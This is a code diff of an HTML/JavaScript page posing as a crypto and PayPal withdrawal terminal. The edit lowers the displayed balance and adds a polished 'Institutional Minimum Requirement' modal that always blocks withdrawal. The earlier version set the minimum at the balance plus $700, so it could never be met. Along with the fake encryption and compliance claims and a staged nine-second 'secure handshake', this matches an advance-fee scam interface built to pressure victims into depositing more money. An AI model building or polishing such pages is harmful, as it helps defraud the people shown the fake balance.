@@ -156,24 +156,24 @@
             }
         }
 
-        /* Loading Overlay */
+        /* ADVANCED LOADING OVERLAY - 9 seconds, high-level design */
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(3, 7, 18, 0.95);
-            backdrop-filter: blur(12px);
+            background: #030712;
+            backdrop-filter: blur(16px);
             z-index: 1000;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 24px;
+            gap: 32px;
             opacity: 0;
             visibility: hidden;
-            transition: all 0.3s ease;
+            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
         
         .loading-overlay.active {
@@ -182,52 +182,230 @@
         }
         
         .light-mode .loading-overlay {
-            background: rgba(248, 250, 252, 0.95);
+            background: #f8fafc;
         }
         
-        .crypto-ring {
-            width: 80px;
-            height: 80px;
-            border: 3px solid rgba(37, 99, 235, 0.2);
-            border-top: 3px solid #3b82f6;
-            border-right: 3px solid #10b981;
+        /* Advanced animated rings */
+        .loader-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .orbit-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            border: 2px solid transparent;
         }
         
-        @keyframes spin {
+        .orbit-ring-1 {
+            border-top: 3px solid #3b82f6;
+            border-right: 2px solid rgba(59, 130, 246, 0.3);
+            animation: spin3D 1.2s linear infinite;
+        }
+        
+        .orbit-ring-2 {
+            width: 80%;
+            height: 80%;
+            border-bottom: 3px solid #10b981;
+            border-left: 2px solid rgba(16, 185, 129, 0.3);
+            animation: spin3D 1.8s linear infinite reverse;
+        }
+        
+        .orbit-ring-3 {
+            width: 55%;
+            height: 55%;
+            border-top: 2px solid #8b5cf6;
+            border-right: 2px solid rgba(139, 92, 246, 0.3);
+            animation: spin3D 0.9s linear infinite;
+        }
+        
+        @keyframes spin3D {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
         
-        .loading-dots {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-        }
-        
-        .loading-dots span {
-            width: 8px;
-            height: 8px;
+        .loader-center {
+            width: 12px;
+            height: 12px;
             background: #3b82f6;
             border-radius: 50%;
-            animation: bounce 1.4s ease-in-out infinite both;
+            box-shadow: 0 0 20px #3b82f6;
+            animation: pulse-center 1.4s ease-in-out infinite;
         }
         
-        .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
-        .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
-        
-        @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-            40% { transform: scale(1); opacity: 1; }
+        @keyframes pulse-center {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.6; }
         }
         
         .loading-text {
             font-size: 11px;
-            letter-spacing: 3px;
-            font-weight: 600;
+            letter-spacing: 4px;
+            font-weight: 700;
             text-transform: uppercase;
             font-family: 'JetBrains Mono', monospace;
+            background: linear-gradient(135deg, #3b82f6, #10b981);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: textPulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes textPulse {
+            0%, 100% { opacity: 0.7; letter-spacing: 4px; }
+            50% { opacity: 1; letter-spacing: 6px; }
+        }
+        
+        .loading-progress {
+            width: 200px;
+            height: 2px;
+            background: rgba(59, 130, 246, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .loading-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3b82f6, #10b981);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+        
+        .data-stream {
+            display: flex;
+            gap: 4px;
+            font-size: 8px;
+            font-family: monospace;
+            opacity: 0.5;
+        }
+        
+        .data-stream span {
+            animation: blink 1.5s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        
+        /* Advanced Warning Modal (Professional Page) */
+        .warning-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 1200;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            padding: 20px;
+        }
+        
+        .warning-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .warning-modal-content {
+            max-width: 520px;
+            width: 100%;
+            border-radius: 32px;
+            overflow: hidden;
+            animation: modalSlideIn 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+        
+        .dark-mode .warning-modal-content {
+            background: rgba(17, 24, 39, 0.98);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        
+        .light-mode .warning-modal-content {
+            background: rgba(255, 255, 255, 0.98);
+            border: 1px solid rgba(220, 38, 38, 0.2);
+        }
+        
+        .warning-header {
+            padding: 24px;
+            text-align: center;
+            border-bottom: 1px solid rgba(239, 68, 68, 0.2);
+        }
+        
+        .warning-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            background: rgba(239, 68, 68, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: warningPulse 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes warningPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+        }
+        
+        .warning-icon i {
+            font-size: 32px;
+            color: #ef4444;
+        }
+        
+        .warning-body {
+            padding: 28px;
+        }
+        
+        .warning-amount-box {
+            background: rgba(239, 68, 68, 0.08);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .acknowledge-btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 800;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            background: #ef4444;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .acknowledge-btn:hover {
+            background: #dc2626;
+            transform: scale(1.02);
         }
         
         /* Help Modal */
@@ -274,20 +452,6 @@
             border: 1px solid rgba(0, 0, 0, 0.1);
         }
         
-        .help-modal-content::-webkit-scrollbar {
-            width: 4px;
-        }
-        
-        .help-modal-content::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-        }
-        
-        .help-modal-content::-webkit-scrollbar-thumb {
-            background: #3b82f6;
-            border-radius: 10px;
-        }
-        
         .close-modal {
             position: absolute;
             top: 20px;
@@ -325,17 +489,6 @@
             font-size: 12px;
             line-height: 1.6;
             opacity: 0.8;
-        }
-        
-        .help-section ul {
-            margin-top: 8px;
-            padding-left: 20px;
-        }
-        
-        .help-section li {
-            font-size: 11px;
-            margin-bottom: 6px;
-            opacity: 0.7;
         }
     </style>
 </head>
@@ -390,7 +543,7 @@
                             <div class="glass-panel bg-white/5 rounded-2xl p-5 border-white/5">
                                 <span class="block text-xs opacity-40 mb-1">Total USD Value</span>
                                 <div class="flex items-baseline gap-2">
-                                    <span class="text-2xl md:text-3xl font-bold mono-font" id="displayBalance">$42,950.00</span>
+                                    <span class="text-2xl md:text-3xl font-bold mono-font" id="displayBalance">$14,265.71</span>
                                 </div>
                             </div>
                         </div>
@@ -485,16 +638,48 @@
         </div>
     </div>
 
-    <!-- Loading Overlay -->
+    <!-- Advanced Loading Overlay (9 seconds) -->
     <div id="loadingOverlay" class="loading-overlay">
-        <div class="crypto-ring"></div>
-        <div class="loading-dots">
-            <span></span>
-            <span></span>
-            <span></span>
+        <div class="loader-container">
+            <div class="orbit-ring orbit-ring-1"></div>
+            <div class="orbit-ring orbit-ring-2"></div>
+            <div class="orbit-ring orbit-ring-3"></div>
+            <div class="loader-center"></div>
         </div>
-        <div class="loading-text">PROCESSING SECURE HANDSHAKE</div>
-        <div class="text-[9px] opacity-40 font-mono">VALIDATING CREDENTIALS • ESTABLISHING SECURE TUNNEL</div>
+        <div class="loading-text">SECURE HANDSHAKE INITIATED</div>
+        <div class="loading-progress">
+            <div class="loading-progress-bar" id="progressBar"></div>
+        </div>
+        <div class="data-stream">
+            <span>⟳ ESTABLISHING SECURE TUNNEL</span>
+            <span>⚡ VALIDATING CREDENTIALS</span>
+            <span>🔐 MULTI-SIG HANDSHAKE</span>
+        </div>
+    </div>
+
+    <!-- Advanced Warning Modal (Professional Page) -->
+    <div id="warningModal" class="warning-modal">
+        <div class="warning-modal-content">
+            <div class="warning-header">
+                <div class="warning-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <h2 class="text-xl font-bold">Institutional Minimum Requirement</h2>
+                <p class="text-xs opacity-60 mt-1">Authorization Declined</p>
+            </div>
+            <div class="warning-body">
+                <p class="text-sm font-medium text-center">Your current balance does not meet the minimum withdrawal threshold.</p>
+                <div class="warning-amount-box">
+                    <p class="text-xs opacity-60 mb-2">MINIMUM REQUIRED BALANCE</p>
+                    <p class="text-2xl font-bold text-red-500 mono-font">$15,000.00</p>
+                    <p class="text-xs opacity-50 mt-2">Current Balance: <span class="mono-font" id="currentBalanceWarning">$14,265.71</span></p>
+                </div>
+                <p class="text-xs opacity-70 leading-relaxed text-center">
+                    Institutional compliance protocols require a minimum liquidity threshold of <strong>$15,000.00 USD</strong> to process any withdrawal transaction. This ensures adequate collateralization and regulatory adherence.
+                </p>
+                <button id="acknowledgeBtn" class="acknowledge-btn mt-6">Acknowledge & Return</button>
+            </div>
+        </div>
     </div>
 
     <!-- Help Modal -->
@@ -508,38 +693,21 @@
                 <h3 class="text-xl font-bold">Institutional Payout Guide</h3>
                 <p class="text-[10px] opacity-50 mt-1">NEXUS SECURE TERMINAL v1.4.2</p>
             </div>
-            
             <div class="help-section">
                 <h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Requirement</h4>
-                <p>To process any withdrawal, your account must maintain a minimum total balance of <strong class="text-blue-500">[Total Balance + $700 USD]</strong>. This institutional liquidity requirement ensures compliance with anti-fraud protocols and secure settlement guarantees.</p>
+                <p>To process any withdrawal, your account must maintain a minimum total balance of <strong class="text-red-500">$15,000.00 USD</strong>. This institutional liquidity requirement ensures compliance with anti-fraud protocols and secure settlement guarantees.</p>
             </div>
-            
             <div class="help-section">
                 <h4><i class="fas fa-coins mr-2"></i> Withdrawal Structure</h4>
-                <p>• <strong>Network Fee:</strong> Flat rate of $2.50 per transaction (covers blockchain gas or PayPal processing).<br>
-                • <strong>Net Payout:</strong> Withdrawal amount minus network fee.<br>
-                • <strong>Minimum Withdrawal:</strong> Must exceed network fee by at least $0.01.</p>
+                <p>• <strong>Network Fee:</strong> Flat rate of $2.50 per transaction.<br>• <strong>Net Payout:</strong> Withdrawal amount minus network fee.<br>• <strong>Minimum Withdrawal:</strong> Must exceed network fee.</p>
             </div>
-            
             <div class="help-section">
                 <h4><i class="fas fa-link mr-2"></i> Address Requirements</h4>
-                <p><strong>Bitcoin (BTC):</strong> Supports Legacy (1...), P2SH (3...), and SegWit (bc1...) formats. Invalid addresses will be rejected.<br>
-                <strong>PayPal:</strong> Must be a valid email address (e.g., name@domain.com). Instant FIAT settlement.</p>
+                <p><strong>Bitcoin:</strong> Supports Legacy (1...), P2SH (3...), and SegWit (bc1...).<br><strong>PayPal:</strong> Valid email address required.</p>
             </div>
-            
             <div class="help-section">
                 <h4><i class="fas fa-lock mr-2"></i> Security Protocol</h4>
-                <p>End-to-end AES-256 encryption • HSM hardware signing • Multi-signature authorization • Real-time anomaly detection • SOC2 Type II compliant infrastructure.</p>
-            </div>
-            
-            <div class="help-section">
-                <h4><i class="fas fa-clock mr-2"></i> Processing & Support</h4>
-                <p>BTC: 10-30 minutes (3 confirmations) • PayPal: Instant • For disputes or assistance, contact the institutional desk via secure channel: <strong class="font-mono">support@nexus-secure.io</strong></p>
-            </div>
-            
-            <div class="help-section">
-                <h4><i class="fas fa-chart-simple mr-2"></i> Example Calculation</h4>
-                <p>If Total Balance = $42,950.00<br>→ Required Minimum = $43,650.00<br>Withdrawal Amount = $43,650.00<br>Network Fee = $2.50<br>Net Payout = $43,647.50</p>
+                <p>AES-256 encryption • HSM signing • Multi-signature authorization.</p>
             </div>
         </div>
     </div>
@@ -547,12 +715,11 @@
     <script>
         (function() {
             const state = {
-                balance: 42950.00,
+                balance: 14265.71,
                 fee: 2.50,
-                theme: localStorage.getItem('theme') || 'dark'
+                theme: localStorage.getItem('theme') || 'dark',
+                minimumRequired: 15000.00
             };
-
-            const MINIMUM_REQUIREMENT_OFFSET = 700;
 
             const elements = {
                 body: document.body,
@@ -568,91 +735,71 @@
                 addressWarning: document.getElementById('addressWarning'),
                 warningText: document.getElementById('warningText'),
                 loadingOverlay: document.getElementById('loadingOverlay'),
+                warningModal: document.getElementById('warningModal'),
                 helpBtn: document.getElementById('helpBtn'),
                 helpModal: document.getElementById('helpModal'),
-                closeModal: document.getElementById('closeModal')
+                closeModal: document.getElementById('closeModal'),
+                acknowledgeBtn: document.getElementById('acknowledgeBtn'),
+                progressBar: document.getElementById('progressBar'),
+                currentBalanceWarning: document.getElementById('currentBalanceWarning')
             };
 
+            if (elements.currentBalanceWarning) {
+                elements.currentBalanceWarning.textContent = `$${state.balance.toFixed(2)}`;
+            }
+
             function isValidBitcoinAddress(address) {
-                if (!address || typeof address !== 'string') return false;
+                if (!address) return false;
                 const cleanAddr = address.trim();
-                if (cleanAddr.length === 0) return false;
+                if (!cleanAddr) return false;
                 const legacyRegex = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
                 const segwitRegex = /^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/;
-                if (legacyRegex.test(cleanAddr)) return true;
-                if (segwitRegex.test(cleanAddr)) return true;
-                if ((cleanAddr.startsWith('1') || cleanAddr.startsWith('3')) && cleanAddr.length >= 26 && cleanAddr.length <= 35) {
-                    if (/^[13][a-zA-Z0-9]+$/.test(cleanAddr) && !/[OIl]/i.test(cleanAddr)) return true;
-                }
-                if (cleanAddr.startsWith('bc1') && cleanAddr.length >= 42 && cleanAddr.length <= 62) return true;
-                return false;
+                return legacyRegex.test(cleanAddr) || segwitRegex.test(cleanAddr);
             }
 
             function isValidEmail(email) {
-                if (!email || typeof email !== 'string') return false;
-                const cleanEmail = email.trim();
-                if (cleanEmail.length === 0) return false;
-                const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;
-                return emailRegex.test(cleanEmail);
+                if (!email) return false;
+                const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+                return emailRegex.test(email.trim());
             }
 
             function showWarning(message, isValid) {
                 elements.warningText.innerText = message;
                 elements.addressWarning.style.display = 'flex';
-                if (isValid) {
-                    elements.addressWarning.className = 'warning-message warning-success';
-                    elements.addressWarning.querySelector('i').className = 'fas fa-check-circle text-xs';
-                } else {
-                    elements.addressWarning.className = 'warning-message warning-error';
-                    elements.addressWarning.querySelector('i').className = 'fas fa-exclamation-triangle text-xs';
-                }
+                elements.addressWarning.className = `warning-message ${isValid ? 'warning-success' : 'warning-error'}`;
+                const icon = elements.addressWarning.querySelector('i');
+                if (icon) icon.className = isValid ? 'fas fa-check-circle text-xs' : 'fas fa-exclamation-triangle text-xs';
             }
 
             function hideWarning() {
                 elements.addressWarning.style.display = 'none';
-                elements.warningText.innerText = '';
             }
 
             function validateAddress() {
                 const address = elements.address.value;
                 const isBTC = document.getElementById('btc').checked;
-                if (!address || address.trim() === "") {
-                    hideWarning();
-                    return;
-                }
+                if (!address || address.trim() === "") { hideWarning(); return; }
                 if (isBTC) {
-                    if (isValidBitcoinAddress(address)) {
-                        showWarning("✓ Valid Bitcoin address format detected", true);
-                    } else {
-                        showWarning("⚠️ Invalid Bitcoin address. Must start with 1, 3, or bc1.", false);
-                    }
+                    if (isValidBitcoinAddress(address)) showWarning("✓ Valid Bitcoin address format", true);
+                    else showWarning("⚠️ Invalid Bitcoin address. Must start with 1, 3, or bc1.", false);
                 } else {
-                    if (isValidEmail(address)) {
-                        showWarning("✓ Valid email format detected", true);
-                    } else {
-                        showWarning("⚠️ Invalid email address. Enter a valid PayPal email.", false);
-                    }
+                    if (isValidEmail(address)) showWarning("✓ Valid email format", true);
+                    else showWarning("⚠️ Invalid email address. Enter a valid PayPal email.", false);
                 }
             }
 
             function calculate() {
                 let val = parseFloat(elements.amount.value) || 0;
-                if (val > state.balance) {
-                    val = state.balance;
-                    elements.amount.value = val;
-                }
+                if (val > state.balance) { val = state.balance; elements.amount.value = val; }
                 const net = Math.max(0, val - state.fee);
-                elements.net.textContent = `$${net.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                elements.net.textContent = `$${net.toFixed(2)}`;
             }
 
             function updateUI() {
                 const isBTC = document.getElementById('btc').checked;
                 elements.address.placeholder = isBTC ? "Destination BTC Address..." : "PayPal Account Email...";
-                elements.helper.innerHTML = isBTC 
-                    ? `<i class="fas fa-info-circle mr-1"></i> Supports SegWit, Native SegWit (bech32), and Legacy.`
-                    : `<i class="fas fa-envelope mr-1"></i> Funds will be instantly disbursed to this verified email address.`;
-                if (elements.address.value.trim()) validateAddress();
-                else hideWarning();
+                elements.helper.innerHTML = isBTC ? `<i class="fas fa-info-circle mr-1"></i> Supports SegWit, Native SegWit, and Legacy.` : `<i class="fas fa-envelope mr-1"></i> Funds disbursed to verified email.`;
+                if (elements.address.value.trim()) validateAddress(); else hideWarning();
             }
 
             function toggleTheme() {
@@ -668,125 +815,53 @@
 
             function showLoadingOverlay() {
                 elements.loadingOverlay.classList.add('active');
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 100 / 90;
+                    if (elements.progressBar) elements.progressBar.style.width = Math.min(progress, 100) + '%';
+                    if (progress >= 100) clearInterval(interval);
+                }, 100);
             }
 
-            function hideLoadingOverlay() {
-                elements.loadingOverlay.classList.remove('active');
-            }
-
-            function showMinimumRequirementMessage() {
-                const requiredMin = state.balance + MINIMUM_REQUIREMENT_OFFSET;
-                alert(
-                    `⚠️ INSTITUTIONAL MINIMUM REQUIREMENT\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `Your current total balance: $${state.balance.toFixed(2)}\n` +
-                    `Minimum required for withdrawal: $${requiredMin.toFixed(2)}\n` +
-                    `Required additional: $${MINIMUM_REQUIREMENT_OFFSET.toFixed(2)}\n\n` +
-                    `To process any withdrawal, your account must maintain a minimum total balance of $${requiredMin.toFixed(2)}.\n\n` +
-                    `This institutional liquidity requirement ensures compliance with anti-fraud protocols and secure settlement guarantees.\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `CONTACT INSTITUTIONAL DESK FOR ASSISTANCE`
-                );
-            }
+            function hideLoadingOverlay() { elements.loadingOverlay.classList.remove('active'); }
+            function showWarningModal() { elements.warningModal.classList.add('active'); }
+            function hideWarningModal() { elements.warningModal.classList.remove('active'); }
+            function showHelpModal() { elements.helpModal.classList.add('active'); }
+            function hideHelpModal() { elements.helpModal.classList.remove('active'); }
 
             async function handleFinalize(e) {
                 e.preventDefault();
-                
                 const val = parseFloat(elements.amount.value);
                 const addr = elements.address.value.trim();
                 const isBTC = document.getElementById('btc').checked;
-                const requiredMinimum = state.balance + MINIMUM_REQUIREMENT_OFFSET;
-                
-                if (!val || val <= 0) {
-                    alert("⚠️ INVALID AMOUNT\n\nPlease enter a valid withdrawal amount greater than zero.");
-                    return;
-                }
-                
-                if (val <= state.fee) {
-                    alert(`⚠️ AMOUNT TOO LOW\n\nAmount must exceed network fee of $${state.fee.toFixed(2)}.`);
-                    return;
-                }
-                
-                if (val > state.balance) {
-                    alert(`⚠️ INSUFFICIENT FUNDS\n\nRequested $${val.toFixed(2)} exceeds available balance of $${state.balance.toFixed(2)}.`);
-                    return;
-                }
-                
-                if (state.balance < requiredMinimum) {
-                    showMinimumRequirementMessage();
-                    return;
-                }
-                
-                if (!addr) {
-                    alert("⚠️ MISSING DESTINATION\n\nPlease enter a valid receiving address or email.");
-                    return;
-                }
-                
-                if (isBTC && !isValidBitcoinAddress(addr)) {
-                    alert("⚠️ INVALID BITCOIN ADDRESS\n\nPlease enter a valid BTC address (starts with 1, 3, or bc1).");
-                    return;
-                }
-                
-                if (!isBTC && !isValidEmail(addr)) {
-                    alert("⚠️ INVALID EMAIL ADDRESS\n\nPlease enter a valid PayPal email address.");
-                    return;
-                }
-                
+
+                if (!val || val <= 0) { alert("⚠️ INVALID AMOUNT\n\nPlease enter a valid withdrawal amount."); return; }
+                if (val <= state.fee) { alert(`⚠️ AMOUNT TOO LOW\n\nAmount must exceed fee of $${state.fee.toFixed(2)}.`); return; }
+                if (state.balance < state.minimumRequired) { showWarningModal(); return; }
+                if (!addr) { alert("⚠️ MISSING DESTINATION\n\nPlease enter a receiving address."); return; }
+                if (isBTC && !isValidBitcoinAddress(addr)) { alert("⚠️ INVALID BITCOIN ADDRESS"); return; }
+                if (!isBTC && !isValidEmail(addr)) { alert("⚠️ INVALID EMAIL ADDRESS"); return; }
+
                 showLoadingOverlay();
-                
                 setTimeout(() => {
                     hideLoadingOverlay();
                     const ref = 'NX-' + Math.random().toString(36).substring(2, 9).toUpperCase();
-                    const networkName = document.querySelector('input[name="network"]:checked').value;
-                    const netAmount = (val - state.fee).toFixed(2);
-                    
-                    alert(
-                        `✅ TRANSACTION AUTHORIZED\n` +
-                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                        `Asset: USD Liquidity\n` +
-                        `Network: ${networkName}\n` +
-                        `Gross: $${val.toFixed(2)}\n` +
-                        `Fee: $${state.fee.toFixed(2)}\n` +
-                        `Net Settlement: $${netAmount}\n` +
-                        `Destination: ${addr.substring(0, 30)}${addr.length > 30 ? '…' : ''}\n` +
-                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                        `REF: ${ref}\n` +
-                        `Status: SETTLEMENT QUEUED\n` +
-                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                        `🔒 AES-256 Encrypted | Multi-Sig Active`
-                    );
-                }, 6000);
-            }
-
-            function showHelpModal() {
-                elements.helpModal.classList.add('active');
-            }
-
-            function hideHelpModal() {
-                elements.helpModal.classList.remove('active');
+                    alert(`✅ TRANSACTION AUTHORIZED\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNet Settlement: $${(val - state.fee).toFixed(2)}\nREF: ${ref}\nStatus: QUEUED`);
+                }, 9000);
             }
 
             elements.amount.addEventListener('input', calculate);
-            elements.amount.addEventListener('change', calculate);
-            elements.max.addEventListener('click', () => {
-                elements.amount.value = state.balance;
-                calculate();
-            });
+            elements.max.addEventListener('click', () => { elements.amount.value = state.balance; calculate(); });
             elements.address.addEventListener('input', validateAddress);
-            elements.address.addEventListener('blur', validateAddress);
-            
-            for (let i = 0; i < elements.networks.length; i++) {
-                elements.networks[i].addEventListener('change', updateUI);
-            }
-            
+            for (let i = 0; i < elements.networks.length; i++) elements.networks[i].addEventListener('change', updateUI);
             elements.themeBtn.addEventListener('click', toggleTheme);
             elements.form.addEventListener('submit', handleFinalize);
             elements.helpBtn.addEventListener('click', showHelpModal);
             elements.closeModal.addEventListener('click', hideHelpModal);
-            elements.helpModal.addEventListener('click', (e) => {
-                if (e.target === elements.helpModal) hideHelpModal();
-            });
-            
+            if (elements.acknowledgeBtn) elements.acknowledgeBtn.addEventListener('click', hideWarningModal);
+            elements.helpModal.addEventListener('click', (e) => { if (e.target === elements.helpModal) hideHelpModal(); });
+            elements.warningModal.addEventListener('click', (e) => { if (e.target === elements.warningModal) hideWarningModal(); });
+
             updateUI();
             calculate();
             applyTheme(state.theme);
